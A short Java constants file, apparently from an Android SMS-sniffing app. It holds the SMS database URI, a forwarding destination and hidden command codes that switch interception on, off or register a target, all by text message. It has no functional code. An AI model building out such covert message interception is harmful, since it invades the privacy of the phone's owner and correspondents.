package sms.sniff;

public class Constants {

	public static String destination;
	public final static String databaseURI = "content://sms/";
	public static String lastSmsText;
	
	public final static String sharedPreferences_Filename = "sniff";
	public final static String sharedPreferences_keepAlive = "keepAlive";
	public final static String sharedPreferences_destination = "destination";
	
	public final static String messageCode_start = "$$on$$";
	public final static String messageCode_pause = "$$off$$";
	public final static String messageCode_register = "$$register$$";
}
